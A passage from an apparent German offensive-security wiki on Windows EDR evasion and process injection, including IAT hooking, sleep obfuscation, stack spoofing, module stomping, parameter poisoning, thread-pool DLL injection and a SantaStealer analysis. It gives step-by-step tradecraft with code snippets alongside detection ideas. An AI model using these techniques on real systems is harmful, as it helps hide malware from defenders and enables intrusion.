- Für die Kompatibilität eine Schnittstelle exportieren, über die ein Aggressor-Skript (oder ein Äquivalent) registrieren kann, welche APIs für Beacon, BOFs und Post-Ex-DLLs gehookt werden sollen.

Warum hier IAT Hooking?
- Funktioniert mit jedem Code, der den gehookten Import verwendet, ohne den Tool-Code zu ändern oder darauf angewiesen zu sein, dass Beacon bestimmte APIs proxyt.
- Deckt Post-Ex-DLLs ab: Durch das Hooken von LoadLibrary* lassen sich Modulladevorgänge abfangen (z. B. System.Management.Automation.dll, clr.dll) und dieselbe Maskierung/Stack-Evasion auf deren API-Aufrufe anwenden.
- Ermöglicht durch Wrapping von CreateProcessA/W die zuverlässige Verwendung von Post-Ex-Befehlen, die Prozesse starten, gegen Erkennungen auf Basis des Call-Stacks.

Minimales IAT-Hook-Beispiel (x64-C/C++-Pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Hinweise
- Wende den Patch nach Relocations/ASLR und vor der ersten Verwendung des Imports an. Reflective Loader wie TitanLdr/AceLdr zeigen das Hooking während DllMain des geladenen Moduls.
- Halte Wrapper klein und PIC-sicher; löse die echte API über den ursprünglichen IAT-Wert auf, den du vor dem Patchen gespeichert hast, oder über LdrGetProcedureAddress.
- Verwende für PIC RW → RX-Übergänge und lasse keine beschreibbaren+ausführbaren Seiten zurück.

Call-stack spoofing stub
- PIC-stubs im Draugr-Stil erstellen eine gefälschte Call-Chain (Rücksprungadressen in benignen Modulen) und springen dann zur echten API.
- Damit werden Erkennungen umgangen, die bei sensiblen APIs kanonische Stacks von Beacon/BOFs erwarten.
- Kombiniere dies mit Stack-Cutting-/Stack-Stitching-Techniken, um vor dem API-Prolog in erwartete Frames zu gelangen.

Operative Integration
- Stelle den reflective Loader den post-ex-DLLs voran, damit PIC und Hooks beim Laden der DLL automatisch initialisiert werden.
- Verwende ein Aggressor-Script, um Ziel-APIs zu registrieren, sodass Beacon und BOFs transparent denselben Evasion-Pfad nutzen, ohne dass Code geändert werden muss.

Überlegungen zu Detection/DFIR
- IAT-Integrität: Einträge, die auf Nicht-Image-Adressen (Heap/anon) zeigen; regelmäßige Überprüfung von Import-Pointern.
- Stack-Anomalien: Rücksprungadressen, die nicht zu geladenen Images gehören; abrupte Übergänge zu Nicht-Image-PIC; inkonsistente RtlUserThreadStart-Abstammung.
- Loader-Telemetrie: In-Process-Schreibzugriffe auf die IAT, frühe DllMain-Aktivität, die Import-Thunks verändert, unerwartete RX-Regionen, die beim Laden erstellt werden.
- Image-Load-Evasion: Wenn LoadLibrary* gehookt wird, überwache verdächtige Ladevorgänge von Automation-/CLR-Assemblies, die mit Memory-Masking-Ereignissen korrelieren.

Verwandte Bausteine und Beispiele
- Reflective Loader, die beim Laden IAT-Patching durchführen (z. B. TitanLdr, AceLdr)
- Memory-Masking-Hooks (z. B. simplehook) und Stack-Cutting-PIC (stackcutting)
- PIC-call-stack-spoofing-stubs (z. B. Draugr)


## IAT-Hooking zur Importzeit + Sleep-Obfuscation (Crystal Palace/PICO)

### IAT-Hooks zur Importzeit über ein resident PICO

Wenn du einen reflective Loader kontrollierst, kannst du Imports **während** `ProcessImports()` hooken, indem du den `GetProcAddress`-Pointer des Loaders durch einen eigenen Resolver ersetzt, der zuerst nach Hooks sucht:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Erstelle ein **resident PICO** (persistentes PIC-Objekt), das bestehen bleibt, nachdem sich der transiente Loader-PIC selbst freigegeben hat.
- Exportiere eine Funktion `setup_hooks()`, die den Import-Resolver des Loaders überschreibt (z. B. `funcs.GetProcAddress = _GetProcAddress`).
- Überspringe in `_GetProcAddress` Ordinal-Imports und verwende eine hashbasierte Hook-Suche wie `__resolve_hook(ror13hash(name))`. Falls ein Hook existiert, gib ihn zurück; andernfalls leite den Aufruf an den echten `GetProcAddress` weiter.
- Registriere Hook-Ziele zur Link-Zeit mit Crystal-Palace-Einträgen im Format `addhook "MODULE$Func" "hook"`. Der Hook bleibt gültig, weil er sich innerhalb des resident PICO befindet.

So erhältst du eine **IAT-Umleitung zur Importzeit**, ohne den Codebereich der geladenen DLL nach dem Laden zu patchen.

### Erzwingen hookbarer Imports, wenn das Ziel PEB-Walking verwendet

Hooks zur Importzeit werden nur ausgelöst, wenn sich die Funktion tatsächlich in der IAT des Ziels befindet. Wenn ein Modul APIs über einen PEB-Walk + Hash auflöst (ohne Import-Eintrag), erzwinge einen echten Import, damit der Pfad `ProcessImports()` des Loaders die Funktion erfasst:

- Ersetze die Auflösung gehashter Exporte (z. B. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) durch eine direkte Referenz wie `&WaitForSingleObject`.
- Der Compiler erzeugt einen IAT-Eintrag, wodurch der reflective Loader den Import beim Auflösen abfangen kann.

### Ekko-artige Sleep-/Idle-Obfuscation ohne `Sleep()` zu patchen

Statt `Sleep` zu patchen, hooke die **tatsächlich vom Implantat verwendeten Wait-/IPC-Primitiven** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Bei langen Wartezeiten kannst du den Aufruf in eine Ekko-artige Obfuscation-Chain einbetten, die das In-Memory-Image während der Inaktivität verschlüsselt:<sup>[[31]](#references)[[27]](#references)</sup>

- Verwende `CreateTimerQueueTimer`, um eine Abfolge von Callbacks zu planen, die `NtContinue` mit speziell erstellten `CONTEXT`-Frames aufrufen.
- Typische Chain (x64): Image auf `PAGE_READWRITE` setzen → per RC4 mit `advapi32!SystemFunction032` das gesamte gemappte Image verschlüsseln → den blockierenden Wait ausführen → per RC4 entschlüsseln → **Berechtigungen pro Section wiederherstellen**, indem die PE-Sections durchlaufen werden → Abschluss signalisieren.
- `RtlCaptureContext` liefert eine Vorlage für `CONTEXT`; klone sie in mehrere Frames und setze Register (`Rip/Rcx/Rdx/R8/R9`), um jeden Schritt aufzurufen.

Operatives Detail: Gib für lange Wartezeiten (z. B. `WAIT_OBJECT_0`) „success“ zurück, damit der Aufrufer fortfährt, während das Image maskiert ist. Dieses Muster verbirgt das Modul während Inaktivitätsfenstern vor Scannern und vermeidet die klassische Signatur eines „gepatchten `Sleep()`“.

Detection-Ideen (telemetriebasiert)
- Serien von `CreateTimerQueueTimer`-Callbacks, die auf `NtContinue` zeigen.
- `advapi32!SystemFunction032`, das auf großen, zusammenhängenden Puffern in Image-Größe verwendet wird.
- `VirtualProtect` auf einem großen Bereich, gefolgt von einer benutzerdefinierten Wiederherstellung der Berechtigungen pro Section.

### Laufzeit-CFG-Registrierung für Sleep-Obfuscation-Gadgets

Bei CFG-aktivierten Zielen führt der erste indirekte Sprung in ein Mid-Function-Gadget wie `jmp [rbx]` oder `jmp rdi` normalerweise zum Absturz des Prozesses mit `STATUS_STACK_BUFFER_OVERRUN`, weil das Gadget nicht in den CFG-Metadaten des Moduls enthalten ist. Damit Ekko-/Kraken-artige Chains in gehärteten Prozessen funktionieren:<sup>[[30]](#references)</sup>

- Registriere jedes von der Chain verwendete indirekte Ziel mit `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` und `CFG_CALL_TARGET_VALID`-Einträgen.
- Bei Adressen innerhalb geladener Images (`ntdll`, `kernel32`, `advapi32`) muss der `MEMORY_RANGE_ENTRY` an der **Image-Basis** beginnen und die **gesamte Image-Größe** umfassen.
- Verwende für manuell gemappte/PIC-/gestompte Bereiche stattdessen die **Allokationsbasis** und die Allokationsgröße.
- Markiere nicht nur das Dispatch-Gadget, sondern auch indirekt erreichte Exporte (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, Wait-/Event-Systemaufrufe) sowie alle ausführbaren, vom Angreifer kontrollierten Sections, die zu indirekten Zielen werden.

Damit werden Sleep-Chains im ROP-/JOP-Stil von „funktioniert nur in Nicht-CFG-Prozessen“ zu einer wiederverwendbaren Primitive für `explorer.exe`, Browser, `svchost.exe` und andere mit `/guard:cf` kompilierte Endpunkte.

### CET-sicheres Stack-Spoofing für schlafende Threads

Der vollständige Austausch von `CONTEXT` ist auffällig und kann auf CET-Shadow-Stack-Systemen fehlschlagen, weil ein gefälschtes `Rip` weiterhin mit dem Hardware-Shadow-Stack übereinstimmen muss. Ein sichereres Sleep-Masking-Muster ist:<sup>[[30]](#references)</sup>

- Wähle einen anderen Thread im selben Prozess und lies dessen `NT_TIB`-/TEB-Stackgrenzen (`StackBase`, `StackLimit`) über `NtQueryInformationThread` aus.
- Sichere den echten TEB/TIB des aktuellen Threads.
- Erfasse den echten Schlafkontext mit `GetThreadContext`.
- Kopiere **nur** das echte `Rip` in den Spoof-Kontext und lasse das gefälschte `Rsp`/den Stackzustand unverändert.
- Kopiere während des Sleep-Fensters den `NT_TIB` des Spoof-Threads in den aktuellen TEB, damit Stack-Walker innerhalb eines legitimen Stack-Bereichs unwinden.
- Stelle nach Ende des Waits den ursprünglichen TIB und Thread-Kontext wieder her.

Dadurch bleibt der Instruction Pointer CET-konform, während EDR-Stack-Walker getäuscht werden, die TEB-Stack-Metadaten zur Validierung des Unwindings heranziehen.

### APC-basierte Alternative: Kraken Mask

Wenn der Timer-Queue-Dispatch zu stark signiert ist, kann dieselbe Abfolge aus Sleep, Verschlüsselung, Spoofing und Wiederherstellung über einen angehaltenen Hilfsthread mit eingereihten APCs ausgeführt werden:<sup>[[27]](#references)</sup>

- Erstelle einen Hilfsthread mit `NtTestAlert` als Entry Point.
- Reiht vorbereitete `CONTEXT`-Frames/APCs mit `NtQueueApcThread` ein und führe sie mit `NtAlertResumeThread` aus.
- Speichere den Chain-Zustand auf dem Heap statt auf dem Stack des Hilfsthreads, um ein Überlaufen des standardmäßigen 64-KB-Thread-Stacks zu vermeiden.
- Verwende `NtSignalAndWaitForSingleObject`, um atomar das Start-Event zu signalisieren und zu blockieren.
- Halte den Hauptthread an, bevor du den TIB/Kontext wiederherstellst (`NtSuspendThread` → Wiederherstellen → `NtResumeThread`), um das Zeitfenster zu verkleinern, in dem ein Scanner einen teilweise wiederhergestellten Stack erfassen könnte.

Damit wird die Signatur `CreateTimerQueueTimer` + `NtContinue` durch eine Hilfsthread-/APC-Signatur ersetzt, während dieselben Ziele für RC4-Masking und Stack-Spoofing erhalten bleiben.

Zusätzliche Detection-Ideen
- `NtSetInformationVirtualMemory` mit `VmCfgCallTargetInformation` kurz vor Sleeps, Waits oder APC-Dispatch.
- `GetThreadContext`/`SetThreadContext` in Verbindung mit `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` oder `ConnectNamedPipe`.
- Auf `NtQueryInformationThread` folgende direkte Schreibzugriffe in die Stackgrenzen des TEB/TIB des aktuellen Threads.
- `NtQueueApcThread`/`NtAlertResumeThread`-Chains, die indirekt `SystemFunction032`, `VirtualProtect` oder Hilfsfunktionen zur Wiederherstellung der Section-Berechtigungen aufrufen.
- Wiederholte Verwendung kurzer Gadget-Signaturen wie `FF 23` (`jmp [rbx]`) oder `FF E7` (`jmp rdi`) als Dispatch-Pivots innerhalb signierter Module.


## Präzises Module Stomping

Module Stomping führt Payloads aus dem **`.text`-Bereich einer DLL aus, die bereits in den Zielprozess gemappt ist**, anstatt offensichtlich privaten ausführbaren Speicher zu allokieren oder eine neue sacrificial DLL zu laden. Als Überschreibungsziel sollte ein **geladenes, dateibasiertes Image** dienen, dessen Codebereich die Payload aufnehmen kann, ohne weiterhin benötigte Codepfade des Prozesses zu beschädigen.<sup>[[1]](#references)[[2]](#references)</sup>

### Zuverlässige Zielauswahl

Naives Stomping auf gängige Module wie `uxtheme.dll` oder `comctl32.dll` ist fragil: Die DLL ist möglicherweise nicht im Remote-Prozess geladen, und ein zu kleiner Codebereich lässt den Prozess abstürzen. Ein zuverlässigerer Ablauf:

1. Enumeriere die Module des Zielprozesses und erstelle eine **Nur-Namen-Include-Liste** der bereits geladenen DLLs.
2. Erstelle zuerst die Payload und notiere ihre **exakte Byte-Größe**.
3. Durchsuche DLLs auf der Festplatte und vergleiche die PE-Section **`.text` `Misc_VirtualSize`** mit der Payload-Größe. Das ist wichtiger als die Dateigröße, da es die Größe des ausführbaren Bereichs **im gemappten Speicher** widerspiegelt.
4. Parse die **Export Address Table (EAT)** und wähle die RVA einer exportierten Funktion als Startoffset für das Stomping.
5. Berechne den **Blast Radius**: Wenn die Payload die Grenze der ausgewählten Funktion überschreitet, überschreibt sie benachbarte Exporte, die danach im Speicher liegen.

Typische Recon-/Auswahl-Hilfsprogramme aus der Praxis:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operative Hinweise
- Bevorzuge DLLs, die im Remote-Prozess **bereits geladen** sind, um die Telemetrie von `LoadLibrary`/unerwarteten Image-Ladevorgängen zu vermeiden.
- Bevorzuge Exports, die von der Zielanwendung nur selten ausgeführt werden. Andernfalls können normale Codepfade vor oder nach der Thread-Erstellung auf die manipulierten Bytes treffen.
- Bei großen Implants muss die Einbettung des Shellcodes oft von einem Stringliteral auf einen **Byte-Array-/Braced-Initializer** umgestellt werden, damit der vollständige Buffer im Injector-Quellcode korrekt dargestellt wird.

Erkennungsideen
- Remote-Schreibvorgänge in ausführbare, durch Images gesicherte Seiten (`MEM_IMAGE`, `PAGE_EXECUTE*`) statt in die üblicheren privaten RWX/RX-Allokationen.
- Export-Einstiegspunkte, deren Bytes im Speicher nicht mehr mit der Datei auf dem Datenträger übereinstimmen.
- Remote-Threads oder Context-Pivots, deren Ausführung innerhalb eines legitimen DLL-Exports beginnt, dessen erste Bytes kürzlich geändert wurden.
- Verdächtige Sequenzen aus `VirtualProtect(Ex)` / `WriteProcessMemory` auf DLL-`.text`-Seiten, gefolgt von einer Thread-Erstellung.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ist eine **Process-Injection-/EDR-Evasion-Technik**, die den klassischen Remote-Schreibpfad (`VirtualAllocEx` + `WriteProcessMemory`) umgeht. Statt Bytes in ein bereits laufendes Ziel zu kopieren, nutzt sie aus, dass Windows **ausgewählte Startparameter von `CreateProcessW` in den Child-Prozess kopiert** und in `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) speichert.<sup>[[28]](#references)[[29]](#references)</sup>

### Durch `CreateProcessW` kopierte, vergiftbare Träger

Nützliche Träger sind:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (mit `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktische Einschränkungen der Träger:

- `lpCommandLine` muss für `CreateProcessW` auf **beschreibbaren Speicher** zeigen und ist auf **32.767 Unicode-Zeichen** einschließlich des Nullterminators begrenzt.
- `lpEnvironment` muss ein Unicode-Umgebungsblock aus aufeinanderfolgenden `NAME=VALUE\0`-Strings sein, der mit einem zusätzlichen `\0` endet.
- `lpReserved` ist offiziell reserviert. Daher sollte das Mapping auf `ShellInfo` als Implementierungsdetail und nicht als stabiler, dokumentierter Vertrag betrachtet werden.

Dadurch wird die normale Prozesserstellung zum **Payload-Transfer-Primitiv**. Der Operator erstellt den Child-Prozess mit vom Angreifer kontrollierten Startdaten und lässt Windows die prozessübergreifende Kopie durchführen.

### Remote-Lookup-Ablauf ohne Remote-Schreib-APIs

Nachdem der Child-Prozess erstellt wurde, wird der kopierte Buffer mit **Nur-Lese-Primitiven** aufgelöst:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` abrufen
2. Den Remote-`PEB` lesen
3. `PEB.ProcessParameters` folgen
4. `RTL_USER_PROCESS_PARAMETERS` lesen
5. Den ausgewählten Zeiger verwenden:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimaler Ablauf:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Ausführen des kopierten Parameterpuffers

Der kopierte Parameterbereich ist normalerweise `RW`, nicht ausführbar. Eine gängige P3-Kette sieht so aus:

1. Prozess normal erstellen (nicht angehalten)
2. Die ausgewählte Parameterseite mit `NtProtectVirtualMemory` / `VirtualProtectEx` ausführbar machen
3. Den bereits in `PROCESS_INFORMATION` zurückgegebenen Handle des Hauptthreads wiederverwenden
4. Die Ausführung mit `NtSetContextThread` umleiten (`CONTEXT_CONTROL`, `RIP` überschreiben)

Anders als bei klassischen Thread-Hijacking-Workflows sind hierfür **weder** `SuspendThread` **noch** `ResumeThread` erforderlich; der Kontext kann direkt über den zurückgegebenen Handle des Hauptthreads geändert werden.

Dadurch werden mehrere APIs umgangen, die häufig auf Injection überwacht werden:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- oft auch `SuspendThread` / `ResumeThread`

### Einschränkung durch Nullbytes und gestaffelter Shellcode

Alle drei Träger sind **String- oder stringartige Daten**, daher wird eine rohe Payload mit `0x00` während der Übertragung abgeschnitten. Eine praktische Umgehung ist eine **nullbytefreie erste Stufe**, die Konstanten zur Laufzeit rekonstruiert und anschließend eine beliebige zweite Stufe lädt.

Ein einfaches Muster ist die XOR-basierte Konstantensynthese:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Dies ermöglicht es der ersten Stufe, Stack-Strings, API-Argumente, DLL-Pfade oder einen Shellcode-Loader der zweiten Stufe zu erstellen, ohne Nullbytes in den übertragenen Parameter einzubetten.

### Stackbasierte API-Aufrufe aus der ersten Stufe

Wenn die erste Stufe APIs wie `LoadLibraryA` aufrufen muss, kann sie:

- den String/Puffer auf den Stack des Zielprozesses pushen
- den **32-Byte-x64-Shadow-Space** reservieren
- `RCX`, `RDX`, `R8`, `R9` auf Konstanten oder relative Zeiger zu `RSP` setzen
- `RSP` vor dem Aufruf **auf 16 Byte ausrichten**

Eine zweite Stufe kann dann vom Stack in eine `PAGE_READWRITE`-Allokation kopiert, mit `VirtualProtect` auf `PAGE_EXECUTE_READ` umgestellt und angesprungen werden. So wird eine direkte RWX-Allokation vermieden.

### Erkennungsmöglichkeiten

Laut den Autoren bieten sich folgende Ansätze zur Suche an:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, wenn damit **Seiten mit Prozessparametern ausführbar gemacht werden**
- auf diese Änderung der Schutzattribute folgend ein Aufruf von `SetThreadContext` / `NtSetContextThread`
- Lesezugriffe auf `PEB` und danach auf `RTL_USER_PROCESS_PARAMETERS` aus einem anderen Prozess
- ungewöhnlich lange Werte oder Werte mit hoher Entropie in `lpCommandLine`, `lpEnvironment` oder `STARTUPINFO.lpReserved` bei der Prozesserstellung

### Hinweise

- P3 ist ein **prozessübergreifender Transfer-Trick** und für sich genommen keine vollständige Ausführungsmethode: Für den kopierten Parameter sind weiterhin eine Änderung der Ausführungsberechtigung und eine Methode zur Umleitung der Ausführung erforderlich.
- `RtlCreateProcessReflection` / Dirty Vanity wurde von den Autoren erwogen, aber verworfen, weil der Aufruf intern verdächtige Primitive wie `NtWriteVirtualMemory` und `NtCreateThreadEx` erreicht.

## Console STDIN pipe injection

Ein interaktiver Konsolenprozess kann ebenfalls als **Payload-Transfer-Primitive** verwendet werden. Der Injector leitet die Standardeingabe des Kindprozesses auf eine Pipe um und sendet einen Marker, gefolgt von Shellcode. Nachdem das Konsolenprogramm die Daten in seinen eigenen privaten Speicher eingelesen hat, sucht der Injector diesen Puffer, macht ihn ausführbar und leitet einen Thread des Kindprozesses dorthin um. Dadurch werden `VirtualAllocEx` und `WriteProcessMemory` vermieden; es handelt sich jedoch weiterhin um Process Injection und nicht um einen allgemeinen EDR-Bypass.<sup>[[41]](#references)</sup>

Trotz der Beschreibung als „named pipe“ ruft die Referenzimplementierung `CreatePipe` auf, wodurch eine **anonyme Pipe** erstellt wird. Windows implementiert anonyme Pipes intern mit eindeutig benannten Pipe-Objekten, aber der PoC wählt weder einen `\\.\pipe\<name>`-Pfad aus noch ruft er `CreateNamedPipe` auf. Er erstellt vererbbare Handles mit einem Standard-Sicherheitsdeskriptor, setzt das Lese-Handle in `STARTUPINFO.hStdInput`, setzt `STARTF_USESTDHANDLES` und startet einen neuen Kindprozess mit aktivierter Handle-Vererbung. Daher startet dieser PoC die angegebene Konsolenanwendung; er verbindet seine Pipe nicht mit einem bestehenden Prozess.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referenzablauf

Die Implementierung verwendet die folgende Abfolge:<sup>[[41]](#references)</sup>

1. Anonyme Pipe-Paare für `STDIN` und `STDOUT` des Kindprozesses erstellen. Die Vererbung für die beiden Handles auf Elternseite deaktivieren und nach der Prozesserstellung die Duplikate auf Kindseite im Elternprozess schließen.
2. Eine interaktive ausführbare Datei wie `netsh.exe` oder `nslookup.exe` mit `CREATE_NEW_CONSOLE` starten. Der Kindprozess erbt die umgeleiteten Standard-Handles.
3. Das vollständige binäre Array `rawData` mit `WriteFile` über das `STDIN`-Handle auf Elternseite senden. Das Konsolenprogramm verarbeitet die Bytes und hinterlässt eine Kopie in einem seiner privaten committeten Speicherbereiche.
4. Den Adressraum des Kindprozesses mit `VirtualQueryEx` durchlaufen, mögliche `MEM_PRIVATE`-Bereiche mit `ReadProcessMemory` lesen und am Anfang von `rawData` nach dem Marker suchen.
5. Den ermittelten Puffer mit `VirtualProtectEx` auf `PAGE_EXECUTE_READWRITE` setzen.
6. Den Hauptthread identifizieren, anhalten, `RIP` mit `NtSetContextThread` auf `found_address + 0x19` setzen und den Thread fortsetzen.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Die bereitgestellte Implementierung ist x64-spezifisch: Sie verändert `CONTEXT.Rip`, und ihr eingebetteter Payload ist x64-Shellcode. `rawData` beginnt mit einem 25-Byte-Marker, daher beginnen ausführbare Bytes beim hexadezimalen Offset `0x19`. Wenn du den Payload ersetzt, musst du dieses Layout beibehalten oder Marker, Suchvektor, Array-Größe und Ausführungs-Offset gemeinsam anpassen. Die Kommentare im Quellcode führen außerdem `0x0A`, `0x0D` und `0x1A` als Bad Characters auf. Dieser Workflow verändert weder das Token noch die Privilegien des Child-Prozesses.<sup>[[41]](#references)</sup>

Kompakte native Helfer und Muster zur Payload-Kompilierung findest du unter [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Thread-Pool-Callback-DLL-Injection ohne Shellcode (DLLParty)

DLLParty passt eine Thread-Pool-Injection im PoolParty-Stil so an, dass ein vorhandener Worker des Zielprozesses `LoadLibraryA` aufruft, anstatt einen injizierten Callback-Stub auszuführen. Als Dispatch-Primitive dient ein `TP_DIRECT`, das an den I/O-Completion-Port des Ziel-Thread-Pools übergeben wird. Damit werden Prozessberechtigungen nicht umgangen: Der PoC ruft `OpenProcess(PROCESS_ALL_ACCESS)` auf und benötigt lesbaren und beschreibbaren Speicher im Zielprozess sowie duplizierbare Worker-Factory- und Completion-Port-Handles.<sup>[[46]](#references)[[47]](#references)</sup>

Unter Windows x64 übergibt der Worker einen Zeiger auf eine stackbasierte `TP_CALLBACK_INSTANCE` in `RCX`, das erste Callback-Argument. `LoadLibraryA` interpretiert denselben Zeiger als `LPCSTR`. Auf dem getesteten Pfad erstellt `TppWorkerThread` den Zeiger bei `RSP+0x178`, während sein erster regulärer Schreibzugriff auf dieses Objekt bei `RSP+0x1d0` erfolgt. Ein nullterminierter DLL-Pfad, der in dieses 0x58 Byte große Präfix passt, kann daher am Anfang der Instanz liegen, ohne vor dem Dispatch überschrieben zu werden. Dies ist eine build-spezifische Beobachtung und keine dokumentierte Windows-ABI-Garantie.<sup>[[46]](#references)[[47]](#references)</sup>

Der Referenz-Workflow sieht wie folgt aus:<sup>[[46]](#references)[[47]](#references)</sup>

1. Ermittle die Handles des Ziels mit `NtQuerySystemInformation(SystemHandleInformation)` und identifiziere `TpWorkerFactory`, indem du die Objekttypen abfragst. Dupliziere ein Worker-Factory-Handle und frage `WorkerFactoryBasicInformation` ab; `StartParameter` liefert den Remote-`TP_POOL`. Überspringe Factories mit `TotalWorkerCount == 0`.
2. Lies `TP_POOL.CompletionPort` aus und durchlaufe die private Worker-Liste des Pools. Im getesteten Windows-10-19045-x64-Build (`ntdll.dll 10.0.19041.4842`) befindet sich ihr Kopf bei `pool+0x60`; jeder Link liegt bei `worker+0x10`, sodass der Callback-Instance-Slot bei `worker+0x38` gleich `link+0x28` ist. Der PoC prüft Zeigerausrichtung, Link-Reziprozität, Pool-Zugehörigkeit, Thread-IDs ungleich null, wiederholte Knoten und einen stabilen Listenkopf.
3. Schreibe den DLL-Pfad in **jeden** ermittelten Worker-Slot, da die eingereihte Completion von jedem Worker verarbeitet werden kann. Platziere ein `TP_DIRECT` mit `Callback = LoadLibraryA` in beschreibbarem Speicher des Zielprozesses. Der PoC verwendet `last_slot-0x500` auf einem Worker-Stack anstelle von `VirtualAllocEx`; dieser Offset ist experimentell und darf nicht mit aktiven Stack-Daten kollidieren.
4. Dupliziere das Completion-Port-Handle des Ziels und rufe `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)` auf. Die Adresse des Remote-`TP_DIRECT` ist der Completion Key. Anschließend ruft ein vorhandener Worker `LoadLibraryA` mit seinem überschriebenen Callback-Instance-Zeiger auf und lädt eine DLL, auf die das Ziel bereits zugreifen kann.

Der PoC erwartet eine Ziel-PID (`DLLParty.exe <target_pid>`) und verwendet einen fest codierten DLL-Pfad in `DLLParty.cpp`; lege vor dem Erstellen einer x64-Executable einen Pfad fest, auf den das Ziel zugreifen kann. Außerdem verwendet er die `LoadLibraryA`-Adresse des eigenen Prozesses als Remote-Callback und setzt daher voraus, dass diese Adresse im Ziel gültig ist. Der Code prüft weder, ob die Pfadlänge in das 0x58 Byte große Präfix passt, noch ob die Worker-Durchlaufsequenz einen Slot gefunden hat, bevor das letzte Element indiziert wird. Überprüfe die privaten Offsets, das Stack-Layout und den beschreibbaren Speicherplatz für den jeweiligen Ziel-Build erneut. Auf `CreateRemoteThreadEx`, Shellcode und `VirtualAllocEx` zu verzichten, beseitigt weder Schreibzugriffe zwischen Prozessen noch die Telemetrie des DLL-Ladens.<sup>[[46]](#references)[[47]](#references)</sup>

## SantaStealer: Taktiken für filelose Umgehung und den Diebstahl von Zugangsdaten

SantaStealer (auch bekannt als BluelineStealer) veranschaulicht, wie moderne Info-Stealer AV-Umgehung, Anti-Analyse und den Zugriff auf Zugangsdaten in einem einzigen Workflow kombinieren.<sup>[[24]](#references)</sup>

### Tastaturlayout-Prüfung und Sandbox-Verzögerung

- Ein Konfigurations-Flag (`anti_cis`) ermittelt mit `GetKeyboardLayoutList` die installierten Tastaturlayouts. Wird ein kyrillisches Layout gefunden, legt das Sample einen leeren `CIS`-Marker an und beendet sich, bevor die Stealer ausgeführt werden. So wird sichergestellt, dass es in ausgeschlossenen Regionen nicht detoniert, während gleichzeitig ein Artefakt für die Suche zurückbleibt.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Mehrstufige `check_antivm`-Logik

- Variante A durchläuft die Prozessliste, hasht jeden Namen mit einer benutzerdefinierten Rolling-Checksumme und vergleicht sie mit eingebetteten Blocklists für Debugger/Sandboxes. Sie berechnet die Checksumme erneut für den Computernamen und prüft Arbeitsverzeichnisse wie `C:\analysis`.
- Variante B untersucht Systemeigenschaften (Mindestanzahl an Prozessen, kurze Betriebszeit), ruft `OpenServiceA("VBoxGuest")` auf, um VirtualBox Additions zu erkennen, und führt Timing-Prüfungen rund um Wartezeiten durch, um Single-Stepping zu erkennen. Bei jedem Treffer wird abgebrochen, bevor Module gestartet werden.

### Fileless-Helper + doppeltes ChaCha20-Reflective-Loading

- Die primäre DLL/EXE enthält einen Chromium-Credential-Helper, der entweder auf die Festplatte geschrieben oder manuell in den Speicher gemappt wird. Im fileless-Modus löst er Imports/Relocations selbst auf, sodass keine Helper-Artefakte geschrieben werden.
- Dieser Helper speichert eine zweite DLL-Stufe, die zweimal mit ChaCha20 verschlüsselt ist (zwei 32-Byte-Schlüssel + 12-Byte-Nonces). Nach beiden Durchläufen lädt er den Blob reflectiv (ohne `LoadLibrary`) und ruft die Exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` auf, die von [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) abgeleitet sind.<sup>[[25]](#references)</sup>
